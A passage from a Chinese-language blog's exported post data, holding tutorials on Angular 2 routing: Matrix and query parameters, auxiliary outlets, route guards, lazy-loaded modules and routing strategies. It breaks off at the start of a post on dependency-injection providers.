比如同一个URL，DetailComponent组件和AlbumComponent组件都可以获取到相同的参数值。而DetailComponent组件并不关心AlbumComponent组件的搜索条件，同时假如DetailComponent组件也希望接收一个同名的参数，但参数数值与传递给AlbumComponent组件的不一样，此时使用Query参数就无法满足需求了。所以更为理想的方式是能够将参数精准的传递给所需的组件，为了实现参数的精准传递，Angular提供了Matrix参数，它通过在链接参数数组中插入一个对象来进行赋值：1&lt;a [routerLink]=\"['/detail', this.contact_id, &#123;after:'2015-01-01', before:'2015-12-31'&#125;, 'album', &#123;after:'2016-01-01', before:'2016-12-31'&#125;]\"&gt;Link&lt;/a&gt; Angular会将该对象的属性转换为以;为分隔符的键值对，拼接到与该对象左边最近的URL分段上，依据上述链接参数数组生成的URL如下，DetailComponent组件和AlbumComponent组件都将获得不同的参数值：1http://localhost:3000/detail/6;after=2015-01-01;before=2015-12-31/album;after=2016-01-01;before=2016-12-31 这种在一个URL分段内使用;分隔键值对的方式称为Matrix URI，其定义每一个URL分段都可以拥有任意多个键值对，每个键值对只为其所在分段服务，虽然Matrix URI一致没有被HTML标准，但它能够清晰地表示每一个URL分段所具有的键值对。Angular利用这个特性，将Matrix参数精确地传递给分段所对应的组件，Matrix参数的获取方式和Path参数一样，可以通过ActivatedRoute服务提供的snapshot和Observable对象两种方式来获取。 附属OutletAngular运行一个路由组件包含多个Outlet，从而可以在一个路由组件中同时显示多个组件，其中，主Outlet（Primary Outlet）有且仅有一个，附属Outlet（Auxiliary Outlet）可以有任意多个，各个附属Outlet通过不同的命名加以区分。每一个Outlet均可以通过路由配置来指定其可以显示的组件，这使得Angular可以灵活地对各个组件进行组合，从而满足不同场景的需求。 在通讯录例子中，假设想灵活地在DetailComponent组件中控制AnnotationComponent组件和相册AlbumComponent组件的显示，那么首先可以在DetailComponent组件的模板中添加一个名为aux的附属Outlet：123456&lt;!-- detail.component.html --&gt;&lt;div class=\"detail-contain\"&gt; &lt;!-- ... --&gt; &lt;router-outlet&gt;&lt;/router-outelt&gt; &lt;router-outlet name=\"aux\"&gt;&lt;/router-outelt&gt;&lt;/div&gt; 接下来来路由配置中定义主要Outlet和附属Outlet上均可以显示AnnotationComponent组件和相册AlbumComponent组件。123456789101112// app.routes.tsexport const rootRouterConfig: Routes = [ &#123;path: 'detail/:id', component: DetailComponent&#125;, children: [ // 主要Outlet &#123; path: '', component: AnnotationComponent&#125;, &#123; path: 'album', component: AlbumComponent&#125;, // 附属Outlet &#123; path: 'annotation', component: AnnotationComponent, outlet:'aux'&#125;, &#123; path: 'album', component: AlbumComponent, outlet:'aux'&#125; ]] 路由拦截Angular的路由拦截，允许从一个配置项跳转到另一个配置项之前执行指定的逻辑，并根据执行的结果来决定是否进行跳转，Angular提供了5类路由拦截： CanActivate，激活拦截 CanActivateChild，与CanActivate类似，用于控制是否允许计划子路由配置项 CanDeactivate，反激活拦截 Resolve，数据预加载拦截 CanLoad，模块加载拦截 激活拦截与反激活拦截激活拦截与反激活拦截用于控制是否可以激活或反激活目标配置项，其工作流程如下： CanActivate在通讯录例子中，假设需要根据用户的登录状态来决定能否访问联系人编辑页，要实现这个功能，可以通过为联系人编辑页添加一个判断登录状态的CanActivate拦截实现。 首先，通过实现CanActivate接口创建拦截服务，该接口只包含了一个canActivate()方法，最简单的情况：当该方法返回true时，表示运行通过CanActivate拦截，否则不允许通过，对目标配置项不予激活。1234567891011121314// can-activate-guard.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; CanActivate &#125; from '@angular/router';@Injectable()export class CanActivateGuard implements CanActivate &#123; canActivate()&#123; if(/*已登录*/)&#123; return true; &#125;else&#123; return false; &#125; &#125;&#125; 然后在目标配置项中指定上述创建的服务作为其CanActivate拦截服务。12345678// app.routes.tsexport &#123; CanActivateGuard &#125; from '../service/can-activate-guard';export const rootRouterConfig: Routes = [&#123; path: 'operate/id/:id', component: OperateComponent, canActivate: [CanActivateGuard]&#125;]; 最后将该服务注入到应用中：12345678// app.module.tsimport &#123; CanActivateGuard &#125; from '../service/can-activate-guard';@NgModule(&#123; // ... providers: [CanActivateGuard]&#125;)export class AppModule&#123;&#125; 除了返回布尔值，canActivate()方法还可以返回一个Observable对象，当该对象触发（emits）true时，表示运行通过拦截，触发false时则表示不允许通过，这个特性使得CanActivate拦截可以根据异步处理结果来判断：12345678910111213// can-activate-guard.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; CanActivate &#125; from '@angular/router';@Injectable()export class CanActivateGuard implements CanActivate &#123; canActivate()&#123; return new Observable&lt;boolean&gt;(observer =&gt; &#123; observer.next(true); observer.complete(); &#125;); &#125;&#125; 此外，Angular还会给canActivate方法传递两个参数： ActivatedRouteSnapshot，表示所要激活的目标配置项，可以通过它访问配置项的相关信息 RouterStateSnapshot，表示应用当前所处的路由状态，其包含了当前所需的所有配置项用法如下：1234567891011121314// can-activate-guard.tsimport &#123; CanActivate, ActivatedRouteSnapshot, RouterStateSnapshot &#125; from '@angular/router';@Injectable()export class CanActivateGuard implements CanActivate &#123; canActivate(route: ActivatedRouteSnapshot, state: RouterStateSnapshot)&#123; //获取配置信息 console.log(route.routeConfig); // RouterStateSnapshot按照路由配置中的定义，将所需的配置项以树形结构方式组织起来 console.log(state.root); return true; &#125;&#125; CanActivateChild用法与CanActivate类似。 CanDeactivate在通讯录例子的编辑页面，当用户单击取消按钮时，可以通过在CanDeactivate拦截中判断联系人信息是否被修改且未保存来决定是否运行离开编辑页，使用CanDeactive拦截的用法可分为以下3步： 首先，通过实现CanDeactivate接口创建拦截服务，该接口只包含了一个canDeactivate()方法，该方法除了第一个参数为目标配置项对应组件的实例外，其他使用方法与canActivate()方法类似。 以同时调用组件实例的isModified()方法来判断组件内容是否发送修改且未保存：1234567891011121314// can-activate-guard.tsimport &#123; CanDeactivate, ActivatedRouteSnapshot, RouterStateSnapshot &#125; from '@angular/router';@Injectable()export class CanDeactivateGuard implements CanDeactivate &#123; canActivate(component: any, route: ActivatedRouteSnapshot, state: RouterStateSnapshot)&#123; if(component.isModified())&#123; return true; &#125; else&#123; return false; &#125; &#125;&#125; 然后在目标配置项中指定该服务作为其CanDeactivate拦截服务：123456789// app.routes.tsexport &#123; CanDeactivateGuard &#125; from '../service/can-activate-guard';export const rootRouterConfig: Routes = [&#123; path: 'operate/id/:id', component: OperateComponent, canActivate: [CanActivateGuard], canDeactivate: [CanDeactivateGuard],&#125;]; 最后将服务注入到应用根模块中即可。 数据预加载拦截数据预加载拦截（Resolve拦截）适用于对数据进行预加载，当确定数据加载成功后，再激活目标配置项，其流程如下： 以如何在通讯录例子中联系人编辑页显示前对联系人信息进行预加载为例，过程分为4步。 首先，通过对Resolve泛型接口创建拦截服务，该服务只有一个resolve()方法，用于执行数据预加载逻辑。该方法可以直接将数据返回，在异步情况下也可以通过Observable对象触发。注意：所返回的任何数据（包括false）都将存放于配置项的data参数部分，如没有预加载到预期的数据，只能通过代码跳转的方式来达到不激活目标配置项的目的：1234567891011121314151617181920212223// resolve-guard.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; Router, Resolve, ActivateRouteSnapshot, RouterStateSnapshot &#125; from '@angular/router';import &#123; ContactService &#125; from '../service/contact.service';@Injectable()export class ResolveGuard implements Resolve&lt;any&gt; &#123; contacts: &#123;&#125;; constructor(private _router: Router, private _contactService: ContactService)&#123;&#125; resolve(route: ActivatedRouteSnapshot, state: RouterStateSnapshot)&#123; // 返回Observable对象 return this._contactService.getContactById(route.params['id']) .map(res =&gt; &#123; if(res)&#123; return res; &#125;else&#123; // 预加载失败，代码跳转至其他配置项 this._router.navigate(['/list']); &#125; &#125;); &#125;&#125; 其次，在目标配置项中指定该服务作为其Resolve拦截服务，以下例配置表示通过ResolveGuard服务预加载的数据将存在data参数的contact属性下：123456789101112// app.routes.tsimport &#123; ResolveGuard &#125; from '../service/resolve-guard';export const rootRouterConfig: Routes = [&#123; path: 'operate/id/:id', component: OperateComponent, canActivate: [CanActivateGuard], canDeactivate: [CanDeactivateGuard], resolve: &#123; contact: ResolveGuard &#125;&#125;]; 然后，将该服务注入到应用模块中。 最后，在目标配置项所指定的组件中访问预加载的数据。123456789// operate.component.ts// ...export class OperateComponent implements OnInit &#123; ngOnInit()&#123; this._activateRoute.data.subscribe(data =&gt; &#123; console.log(data.contact); &#125;) &#125;&#125; 模块的延迟加载Angular应用由一个根模块和任意多个特性模块组成，一个大型的应用通常包含很多特性模块，若在首屏加载时便将所有的特性模块加载进来，对于用户体验和服务器负载均会不利，为此，Angular路由提供了对特性模块进行延迟加载的支持，使得只有在真正需要某一个模块的时候，才将其加载进来。 延迟加载实现通讯录只有一个根模块，为了演示如何进行特性模块的延迟加载，将OperateComponent组件从根模块中抽取出来，单独为其创建一个OperateModule模块，与根模块需要初始化各项路由服务不同，特性模块仅需要对其路由进行解析，因此子路由模块通过调用RouterModule.forChild()方法来创建。12345678910111213141516171819// operate.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; FormsModule &#125; from '@angular/forms';import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; Routes, RouterModule &#125; from '@angular/router';import &#123; OperateComponent &#125; from '../widget/operate.component';import &#123; ContactService &#125; from '../service/contact.service';const operateRoutes: Routes = [ &#123;path: 'id/:id', component: OperateComponent &#125;, &#123;path: 'isAdd/:isAdd', component: OperateComponent &#125;];@NgModule(&#123; imports: [BrowserModule, FormsModule, RouterModule.forChild(operateRoutes)], declarations: [OperateComponent], providers: [ContactService]&#125;)export class OperateModule &#123;&#125; 此后OperateComponent组件便不再需要在根模块AppModule中导入。123456789// app.module.ts@NgModule(&#123; declarations: [ // OperateComponent, // ... ], // ...&#125;)export class AppModule&#123;&#125; 最后需要对根模块的路由配置进行修改，通过配置项的loadChildren属性来指定需要进行延迟加载的模块：12345678// app.routes.ts// ...export const rootRouterConfig: Routes = [ // OperateComponent组件的配置项已在OperateModule模块定义，故不需要下面的配置了 // &#123;path: 'operate/id/:id', component: OperateComponent &#125;, // &#123;path: 'operate/isAdd/:isAdd', component: OperateComponent &#125; &#123; path: 'operate', loadChildren: 'app/router/operate.module.ts#OperateModule'&#125;]; 模块加载拦截默认情况下，若URL匹配到延迟加载的配置项，相应的特性模块便会被加载进来，若想动态判断是否对该模块进行加载，可以使用CanLoad拦截。 CanLoad拦截的用法和CanActivate等其他拦截类似，首先实现CanLoad接口来创建拦截服务，由于在触发CanLoad拦截时，相应的特性模块还未被加载，因此能传递给canLoad()方法的只有延迟加载配置项的信息：12345678910111213141516// can-load-guard.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; CanLoad, Route &#125; from '@angular/router';@Injetable()export class CanLoadGuard implements CanLoad &#123; canLoad(route: Route)&#123; // route参数为延迟加载配置项 console.log(route.path); // 输出 operate if(/* 运行加载 */)&#123; return true; &#125;else&#123; return false; &#125; &#125;&#125; 接着，在延迟加载配置项中指定CanLoad拦截服务：12345678// app.routes.tsimport &#123; CanLoadGuard &#125; from '../service/can-load-guard';export const rootRouterConfig: Routes = [&#123; path: 'operate', loadChildren: 'app/router/operate.module.ts#OperateModule', canLoad: [CanLoadGuard]&#125;]; 最后，将CanLoad拦截服务注入根模块：12345678// app.module.tsimport &#123; CanLoadGuard &#125; from '../service/can-load-guard';@NgModule(&#123; // ... providers: [CanLoadGuard]&#125;)export class AppModule&#123;&#125;","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-路由-1","slug":"angular12","date":"2017-10-20T10:19:08.000Z","updated":"2017-12-06T14:50:08.805Z","comments":true,"path":"2017/10/20/angular12/","link":"","permalink":"https://github.com/xmoyKING/2017/10/20/angular12/","excerpt":"","text":"学习路由的相关内容，包括路由的基本原理、路由跳转、参数传递等。如何使用路由来对各组件进行管理，如何通过对各组件进行灵活搭配来满足不同业务场景的需求。 概述和基本用法路由所需要解决的核心问题是通过建立URL和页面的对应关系，使得不同的页面可以用不同的URL来表示。主流前端框架围绕这个问题给了各自的路由实现，虽然语法和工作机制各不相同，但理念却殊途同归。 在Angular中，页面由组件构成，因此URL和页面的对应关系实质上就是URL和组件的对应关系。建立URL和组件的对应关系可通过路由配置来指定。路由配置包含多个配置项，最简单的情况是一个配置项包含了path和component两个属性，path属性将被Angular用来生成一个URL，而component属性则指定了该URL所对应的组件。 在定义了路由配置后，Angular路由将以其为依据，来管理应用中各个组件，路由的核心工作流程如下图： 当用户在浏览器输入URL后，Angular将获取该URL并将其解析生成一个UrlTree实例 在路由配置中寻找并激活与UrlTree实例匹配的配置项 为配置项中指定的组件创建实例 将该组件渲染于路由组件的模板中&lt;router-outlet&gt;指令所在位置 Angular路由最为基本的用法是将一个URL所对应的组件在页面中显示出来，有3个步骤： 定义路由配置 创建根路由模块 添加&lt;router-outlet&gt;指令标签 以联系人列表页和收藏页为例。 1.路由配置路由配置是一个Routes类型的数组，数组的每一个元素即为一个路由配置项。1234567891011// app.routes.tsimport &#123; Routes &#125; from '@angular/router';import &#123; ListComponent &#125; from './list/list.component';import &#123; CollectionComponent &#125; from './collection/collection.component';export const rootRouterConfig: Routes = [ // ... &#123;path: 'list', component: ListComponent &#125;, &#123;path: 'collection', component: CollectionComponent &#125;,]; 2.创建根路由模块根路由模块包含了路由所需的各项服务，是路由工作流程运行的基础。通过调用RouterModule.forRoot()方法来创建根路由模块，传入路由配置rootRouterConfig。12345678910111213// app.module.tsimport &#123; ModuleWithProviders &#125; from '@angular/core';import &#123; RouterModule &#125; from '@angular/router';import &#123; rootRouterConfig &#125; from './app.routes'let rootRouterModule: ModuleWithProviders = RouterModule.forRoot(rootRouterConfig);@NgModule(&#123; imports: [rootRouterModule], // ...&#125;)export class AppModule&#123;&#125; 根路由模块默认提供的路由策略为PathLocationStrategy，该策略要求应用必须设置一个base路径，作为前缀来生成和解析URL，设置base路径最简单的方式是在index.html文件中设置&lt;base&gt;元素的href属性。 3.添加RouterOutlet指令RouterOutlet指令的作业是在组件的模板中开辟出一块区域，用于显示URL对应的组件。Angular将模板中使用了&lt;router-outlet&gt;标签的组件统称为路由组件。1234&lt;!-- app.component.html --&gt;&lt;main class=\"main\"&gt; &lt;router-outlet&gt;&lt;/router-outlet&gt;&lt;/main&gt; 路由策略Angular提供PathLocationStrategy和HashLocationStrategy两种路由策略，分别表示使用URL的path部分和hash部分来进行路由匹配。以通讯录联系人列表页的配置项为例： 使用PathLocationStrategy策略，URL是http://localhost:3000/list 使用HashLocationStrategy策略，URL是http://localhost:3000/#/list HashLocationStrategy策略HashLocationStrategy策略是Angular最为常见的策略，原理是利用了浏览器在处理hash部分的两个特性： 浏览器向服务器请求时不会带上hash部分的内容，对于HashLocationStrategy策略配置项所对应的URL，浏览器向服务器发送的请求都是同一个，服务器只需返回首页，Angular在获取首页后根据hash的内容去匹配路由配置项并渲染相应的组件。 更改URL的hash部分不会向服务器重新发送请求，这使得在跳转的时候不会引发页面的属性和应用的重新加载 使用该策略，只需在注入路由服务时使用useHash属性指定：123456// app.module.ts@NgModule(&#123; imports: [RouterModule.forRoot(rootRouterConfig, &#123;useHash: true&#125;)], // ...&#125;)export class AppModule&#123;&#125; PathLocationStrategy策略PathLocationStrategy使用URL的path部分来进行路由匹配，因此与HashLocationStrategy策略不同，浏览器会将配置项对应的URL原封不动的发送到服务器。 作为Angular的默认路由策略，其最大的有点在于为服务器端渲染提供了可能，比如，当使用PathLocationStrategy策略获取联系人列表页时，浏览器会向服务器发送请求http://localhost:3000/list，服务器可以通过解析URL上的path部分/list得知所访问的页面，对其进行渲染并将结果返回给浏览器，而当使用HashLocationStrategy策略时，由于hash不会发送到服务器，所以个页面请求的都是同一个URL，导致服务器无法通过URL得知所要访问的页面，也就无从渲染了。 使用PathLocationStrategy策略必须满足3个条件： 浏览器支持H5的history.pushState()方法，此方法是RouterLink指令在跳转时即使更改了URL的path部分也不会引起页面刷新的关键。 需要在服务器进行设置，将应用的所有URL重定向到应用的首页，这个因为该策略所生成的URL在服务器上并不存在对应的文件结构，如果不重定向，服务器将返回404错误。 需要为应用设置一个base路径，Angular将以base路径为前缀来生成和解析URL，好处是服务器可以根据base路径来区分来自不同应用的请求。 设置base路径有2个方式，一个是通过设置&lt;base&gt;标签的href属性。另一个就是通过向应用注入APP_BASE_HREF变量来实现：12345678// app.module.tsimport &#123; Component, NgModule &#125; from '@angular/core';import &#123; APP_BASE_HREF &#125; from '@angular/common';@NgModule(&#123; providers: [&#123;provide: APP_BASE_HREF, useValue: '/app'&#125;], // 将base路径设置为'/app'&#125;)export class AppModule &#123;&#125; 若两种方式同时使用，则APP_BASE_HREF变量优先级更高。 路由跳转Web中页面跳转，指的是应用响应某个事件，从一个页面跳转到另一个页面的行为。对于使用Angular构建的单页应用而言，页面跳转实质就是从一个配置项跳转到另一个配置项的行为。当某个事件引发了跳转时，Angular会根据跳转时的参数生成一个UrlTree实例来和配置项进行匹配，若成功则显示相应的组件并将新URL更新在浏览器地址栏上，若匹配不成功则报错。 ANgular应用进行页面跳转有2种方式。 使用指令跳转指令跳转通过使用RouterLink指令来完成，该指令接收一个链接参数数组，Angular将根据该数组来生成UrlTree实例进行跳转。通讯录例子中的FooterComponent组件将RouterLink指令应用在a标签上，分别为联系人列表页和收藏页定义了两个超链接，当用户单击超链接时便会跳转到相应的页面:12345678&lt;!-- app/shared/footer.component.html --&gt;&lt;nav&gt; &lt;!-- http://localhost:3000/collection --&gt; &lt;a [routerLink]=\"['/collection']\"&gt; &lt;i&gt;收藏&lt;/i&gt;&lt;/a&gt; &lt;!-- http://localhost:3000/list --&gt; &lt;a [routerLink]=\"['/list']\"&gt; &lt;i&gt;通讯录&lt;/i&gt;&lt;/a&gt;&lt;/nav&gt; 若不借助RouterLink指令而是使用原生HTML的方式来定义超链接（如&lt;a href=&quot;/collection&quot;&gt;&lt;i&gt;收藏&lt;/i&gt;&lt;/a&gt;），则单击链接后会导致页面重新加载。 Angular通过以下两个步骤保证在不重新加载应用的情况下完成跳转 在click事件中调用preventDefault()方法来禁止a标签的默认行为（阻止向服务器发送默认的GET请求，避免跳转加载） 调用Router.navigateByUrl()方法来启动跳转流程RouterLink的源码如下：123456@HostListener('click', ['$event.button', '$event.ctrlKey', '$event.metaKey'])onClick(button: number, ctrlKey: boolean, metaKey: boolean): boolean &#123; // ... this.router.navigateByUrl(this.urlTree); //跳转至指定页面，渲染对应组件 return false; // 当HostListener装饰器返回false时，Angular会调用preventDefault方法&#125; RouterLink指令的一个特性就是它可以应用在任何HTML元素上，使得页面跳转不需要依赖超链接。例如：&lt;button [routerLink]=&quot;[&#39;/list&#39;]&quot;&gt; &lt;i&gt;通讯录&lt;/i&gt;&lt;/button&gt; 当RouterLink被激活时，还可以通过RouterLinkActive指令为其相应的HTML元素指定CSS类。比如定义一个CSS类.active，通过routerLinkActive将其赋给收藏页的链接，当单击该链接后，CSS类将被应用到标签上：12345678&lt;!-- footer.component.html --&gt;&lt;nav&gt; &lt;!-- http://localhost:3000/collection --&gt; &lt;a [routerLink]=\"['/collection']\" routerLinkActive=\"active\"&gt; &lt;i&gt;收藏&lt;/i&gt;&lt;/a&gt; &lt;!-- http://localhost:3000/list --&gt; &lt;a [routerLink]=\"['/list']\"&gt; &lt;i&gt;通讯录&lt;/i&gt;&lt;/a&gt;&lt;/nav&gt; 而routerLinkActive指令除了可以用于routerLink所在的元素外，还可以作用于这些元素的任意祖先元素，当该祖先元素下的任意routerLink处于激活状态时，该祖先元素都将获得routerLinkActive指定的CSS类,下例中当前页面无论是在收藏页或通讯录页，nav标签都将获得CSS类：12345678&lt;!-- footer.component.html --&gt;&lt;nav routerLinkActive=\"active\"&gt; &lt;!-- http://localhost:3000/collection --&gt; &lt;a [routerLink]=\"['/collection']\"&gt; &lt;i&gt;收藏&lt;/i&gt;&lt;/a&gt; &lt;!-- http://localhost:3000/list --&gt; &lt;a [routerLink]=\"['/list']\"&gt; &lt;i&gt;通讯录&lt;/i&gt;&lt;/a&gt;&lt;/nav&gt; 使用代码跳转从RouterLink指令的部分源码可知，跳转流程是通过调用Router.navigateByUrl()方法来启动的，RouterLink指令仅响应click事件，若需要响应其他事件或需要根据运行时的数据动态决定跳转，则可以通过调用Router.navigateByUrl()或Router.navigate()来完成。 假如需要在进入联系人页后1s自动跳转到收藏页的功能：1234567891011// list.component.tsimport &#123; Router &#125; from '@angular/core';// ...export class ListComponent implements OnInit &#123; constructor(private _router: Router)&#123; setTimeout(() =&gt; &#123; _router.navigateByUrl('/collection'); // 或 _router.navigate(['/collection']); &#125;, 1000); &#125;&#125; Router.navigateByUrl()和Router.navigate()的底层,最终都是通过调用Router.scheduleNavigation()方法来执行跳转，不同的地方在于两个方法指定跳转的目标配置项的方式。Router.navigateByUrl()方法通过一个URL字符串或UrlTree实例来指定。12345678910navigateByUrl(url: string|UrlTree, extras: NavigationExtras = &#123;skipLocationChanges: false&#125;): Promise&lt;boolean&gt; &#123; if(url instanceof UrlTree)&#123; return this.scheduleNavigation(url, extras); &#125;else &#123; // 解析URL字符串生成对应的UrlTree实例 const urlTree = this.urlSerializer.parse(url); // 使用UrlTree实例进行跳转 return this.scheduleNavigation(urlTree, extras); &#125;&#125; 而Router.navigate()方法和RouterLink指令相似，通过链接参数数组来指定：1234navigate(commands: any[], extras: NavigationExtras = &#123;skipLocationChanges: false&#125;): Promise&lt;boolean&gt; &#123; // 通过链接参数数组生成对应的UrlTree实例 return this.scheduleNavigation(this.createUrlTree(commands, extras), extras);&#125; 这两个方法除了可以通过第一个参数来指定目标配置项外，还支持用extras参数定义跳转的具体行为。例如，若想要在不改变URL的情况下完成跳转,可调用_router.navigateByUrl(&#39;/collection&#39;, {skipLocationChange: true}) 路由参数在组件部分中学习如何使用@Input装饰器向组件传递数据，除此外，Angular路由还提供了路由参数的功能，允许通过URL向组件传递数据，在通讯录例子中，若想通过URL对不同的联系人进行区分，一种简单的实现方式是将联系人的id添加到URL中，此后联系人详情页通过提取URL中的联系人id便可以进一步获取该联系人的详情并予以显示。 Angular路由获取URL参数包括Path参数和Query参数两种。 Path参数Path参数指通过解析URL的path部分来获取参数，在定义一个配置项的path属性时，可以使用/字符对path属性进行分段，若一个分段以:字符开头，则URL中与该分段进行匹配的部分将作为参数传递到组件中。 以联系人详情页的路由配置项为例，其定义了一个名为id的Path参数，例如http://localhost:3000/detail/1,参数id为1。1234567// app.routes.tsexport const ContactAppRouters: RouterConfig = [ &#123; path: 'detail/:id', component: DetailComponent &#125;] 注意：只有当URL解析出来的分段数与Path属性的分段数一致时，才能匹配到该配置项。例如： http://localhost:3000/detail 分段数为1 http://localhost:3000/detail/1 分段数为2 http://localhost:3000/detail/1/segment 分段数为3 给路由参数赋值，除了可以直接在浏览器上输入URL外，还可以通过RouterLink指令或跳转方法来完成。12345678// Angular 会将链接参数数组的每一个非对象元素当成一个分段进行拼接// 如下的链接参数数组对应的path为 'detail/1'&lt;a [routerLink]=\"['/detail', 1]\"&gt;_router.navigate(['/detail', 1]);// 或直接指定path_router.navigate(['/detail/1']); 在组件中获取Path参数，需要导入ActivatedRoute服务，该服务提供了两种方式，分别适用于不同页面间跳转和同一页面内跳转。 Angular应用从一个页面跳转到另一个新页面，实质上是从一个配置项跳转到另一个配置项，在这个过程中，Angular除了会为配置项所对应的组件创建实例外，还会为该配置项本身创建一个ActivatedRoute实例来表示该配置项已被激活。该ActivedRoute实例包含了一个快照（即snapshot属性），记录从当前URL中解析出来的所有Path参数。 以通讯录例子中的DetailComponent组件如何通过snapshot属性获取Path参数：1234567891011121314151617181920// detail.component.ts// 1. 导入ActivatedRoute服务import &#123; ActivatedRoute &#125; from '@angular/router';// ...export class DetailComponent implements OnInit, OnDestroy&#123; contact_id: string; constructor(private _activatedRoute: ActivatedRoute)&#123; console.log('创建DetailComponent组件实例'); &#125; ngOnInit()&#123; // 2. 通过snapshot获取path参数 this.contact_id = this._activatedRoute.snapshot.params['id']; console.log('参数id值为:'+ this.contact_id); &#125; // ...&#125; 访问http://localhost:3000/detail/1即可看到输出的id值为1. 如何在通讯录例子页面跳转时获取参数值？首先在联系人详情组件的模板detail.component.html上添加一个链接，希望达到的效果是当单击该链接后，能够显示下一名联系人的信息。12345678910111213&lt;!-- detail.component.html --&gt;&lt;div class=\"detail-contain\"&gt; &lt;div class=\"header-detail\"&gt; &lt;a [routerLink]=\"['']\" class=\"back-to-list\"&gt; &lt;i class=\"icon-back\"&gt;&lt;/i&gt;所有联系人 &lt;/a&gt; &lt;a [routerLink]=\"['/detail', nextContactId()]\" class=\"back-to-list\"&gt; 下一个联系人 &lt;/a&gt; &lt;!-- .... --&gt; &lt;/div&gt; &lt;!-- .... --&gt;&lt;/div&gt; nextContactId()方法通过简单的加1来获取下一名联系人的id：12345678// detail.component.ts// ...export class DetailComponent implements OnInit, OnDestroy &#123; // ... nextContactId()&#123; return parseInt(this.contact_id) + 1; &#125;&#125; 假设当前URL为http://localhost:3000/detail/1,单击下一个联系人链接后，URL按照预期变成了http://localhost:3000/detail/2，但在页面上显示的仍然是原先联系人的信息，这个因为Angular在处理同一个页面内跳转时，不会重新创建组件的实例，所以组件的构造函数和ngOnInit()方法都没有被调用到，虽然Angular会将快照中参数id的值更新为2，但没有将这个更新通知到组件，为了解决这个问题，ActivatedRoute服务提供了Observable对象，允许对参数的更新进行订阅。12345678910111213141516171819202122// detail.component.ts// ... export class DetailComponent implements OnInit, OnDestory &#123; contact_id: string; private sub: any; // ... ngOnInit()&#123; this.sub = this._activatedRoute.params.subscribe(params =&gt; &#123; this.contact_id = params['id']; console.log('参数值id为：'+ this.contact_id); this.getById(this.contact_id); &#125;); &#125; ngOnDestroy() &#123; // 避免内存系列，在组件销毁时取消订阅 this.sub.unsubscribde(); &#125; // ...&#125; Query参数通过解析URL的query部分来获取参数值，由于URL的query部分不用和配置项进行匹配，因此每一个配置项都可以拥有任意多个查询参数。 以URL给联系人列表页定义一个表示页面显示5个联系人的查询参数为例http://localhost:3000/list?limit=5 与Path参数类似，Query参数同样可以通过RouterLink指令或者跳转方法来赋值：1234&lt;a [routerLink]=\"['/list']\" [queryParams]=\"&#123;limit:5&#125;\"&gt;&lt;/a&gt;this.router.navigat(['/list'], &#123;queryParams: &#123;limit:5&#125;&#125;);this._router.navigateByUrl('/list?limit=5'); Query参数的获取，需要借助于ActivatedRoute服务提供的Observable类型对象queryParams来完成。下面代码通过获取Query参数来对显示在页面上的联系人数目进行限制：1234567891011121314151617181920212223242526272829// list.component.tsimport &#123; ActivatedRoute &#125; from '@angular/router';export class ListComponent implements OnInit, OnDestroy &#123; constacts: any[]; private limit: number; private sub: any; constructor(private _activatedRoute: ActivatedRoute)&#123;&#125; ngOnInit()&#123; this.getContacts(); &#125; ngOnDestroy()&#123; this.sub.unsubscribe(); &#125; getContacts()&#123; // ... this.sub = this._activatedRoute.queryParams.subscribe(params =&gt; &#123; this.limit = parseInt(params['limit']); if(this.limit)&#123; this.contacts.splice(this.limit); &#125; &#125;); &#125;&#125; Matrix参数页面上所有组件都可以访问Query参数的内容，若想精确的向某一个组件传递参数，则需要使用Matrix参数。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-依赖注入-2","slug":"angular11","date":"2017-10-17T10:13:49.000Z","updated":"2017-12-06T14:50:08.805Z","comments":true,"path":"2017/10/17/angular11/","link":"","permalink":"https://github.com/xmoyKING/2017/10/17/angular11/","excerpt":"","text":"ProviderProvider这个概念其实是一个设计模式。Provider模式是指实现逻辑操作或数据操作的封装，以接口的方式提供给调用方使用，Provider模式有很好的可扩展性和灵活性。 在Angular中，Provider描述了注入器如何初始化标识（Token）所对应的依赖服务，它最终用于注入到组件或者其他服务中。Provider提供了一个运行时所需的依赖，注入器依靠它来创建服务对象的实例。这个过程好比厨师（注入器）根据菜谱（Provider）制作一道名为LoggerService(标识)的菜（整个过程就是完成了一次依赖注入服务）。 其中Providers有简写形式和完整形式两种,具体如下：12345// 简写形式，于完整形式等价providers: [LoggerService]// 完整形式providers: [&#123;provide: LoggerService, useClass: LoggerService&#125;] 完整形式采用对象字面量来描述一个Provider的构成要素，其中provide属性可以理解为这个Provider的唯一标识（即在应用中使用的服务名），用于定位依赖值和注册Provide，而useClass属性则代表使用哪个服务类去创建实例。 Angular中Provider引进标识机制解决了AngularJS1版本的几个问题： 标识是字符串，作为唯一标识（Angular会有一个标识映射表来保证唯一性）不再依赖于具体的类，可避免命名空间污染 代码只依赖一个抽象的标识，不再依赖具体的实现，可以在运行时动态替换 实际上，标识既可以是字符串也可以是其他数据类型，当多个字符串同时映射到同一个标识时，会以最后一个为准，这可能会导致一些隐含的问题，为了解决标识名冲突问题，Angular引入了OpaqueToken（不透明标识），可以保证生成的标识都是唯一的。 Provider注册方式Provider的主要作用是注册并返回合适的服务对象，Angular有4种常见的Provider注册形式： 类Provider 值Provider 别名Provider 工厂Provider 类Provider类Provider基于标识来指定依赖项，这种方式可以使得依赖项能够被动态指定为其他不同的具体实现，只要接口不变，对于使用方就是透明的。典型场景就是数据渲染服务（Render），Render服务对上层应用提供的接口是固定的，但底层可以用DOM渲染方式（DomRender），也可以用Canvas渲染方式（CanvasRender），还可以用Angular 